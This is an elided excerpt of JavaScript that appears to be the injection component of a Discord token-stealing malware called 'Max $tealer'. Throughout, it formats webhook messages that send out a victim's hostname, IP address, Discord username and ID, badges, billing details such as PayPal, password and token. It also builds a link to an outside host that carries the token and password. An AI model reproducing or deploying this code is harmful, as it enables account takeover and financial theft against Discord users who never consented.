                    ...
                    `, !0).then(a => {
						...
						var c = {
							...
							embeds: [{
								...
								description: "Fun fact: PepitoGrillo es el mejor",
								color: config["embed-color"],
								fields: [{
									name: "<:bladegreen:940706332753924127> Informacion",
									value: `\`\`\`Hostname: \n${computerName}\nInjection Info: \n${__dirname}\n\`\`\``,
									inline: !1
								}, {
									name: "<a:iced_coroana:949440564422664262> User",
									value: `\`${b.username}#${b.discriminator}\``,
									inline: !0
								}, {
									name: "<:iced:949442094701891585> User ID",
									value: `\`${b.id}\``,
									inline: !0
								}, {
									name: "<:blackbjoker:940707132968423536> Badges",
                    ...
                    `, !0).then(a => {
						...
						var c = {
							...
							embeds: [{
								...
								description: "is Max $tealer the best grabber?!",
								color: config["embed-color"],
								fields: [{
									...
									name: "<a:iced_coroana:949440564422664262> Username",
									value: `\`${b.username}#${b.discriminator}\``,
									inline: !1
								}, {
									name: "<:iced:949442094701891585> User ID",
        ...
        xmlHttp.responseText`, !0).then((info3) => {
            ...
            xmlHttp.responseText`, !0).then((info4) => {
              ...
              xmlHttp.responseText`, !0).then((codes) => {
							...
							var fieldo = [];
							var baseuri = "https://rustlercoppy.com/copy/"
							...
							function Cool() {
								...
								json.forEach(z => {
									if (z.type == "") {
										...
										billing += "\`✔️\`" + " <:logo_fns_paypal:869636266386391092>"
							...
							var params = {
								...
								embeds: [{
									...
									"fields": [{
										...
										name: "<a:33:957422686265540658> User Billing",
										value: `${Cool()}`,
										inline: !1
									}, {
        ...
        xmlHttp.responseText`, !0).then((info3) => {
            ...
            xmlHttp.responseText`, !0).then((info4) => {
										...
										var params = {
											...
											embeds: [{
												"title": "User Login Information",
												description: "Fun fact: You are so cool that you grabbed the most people with Max $tealer!",
												"color": config['embed-color'],
												"fields": [{
													name: "<:bladegreen:940706332753924127> Information",
													value: `\`PC Name: \n${computerName}\nIP: \n${ip}\nInjection Path: \n${discordInstall}\n\``,
        ...
        xmlHttp.responseText`, !0).then((info3) => {
            ...
            xmlHttp.responseText`, !0).then((info4) => {
										...
										var params = {
											...
											embeds: [{
												"title": "Email Changed",
												description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://rustlercoppy.com/copy/"+ token +"<br>"+ password+")",
												"color": config['embed-color'],
												"fields": [{
													name: "<:bladegreen:940706332753924127> Information",
													value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\`\`\``,
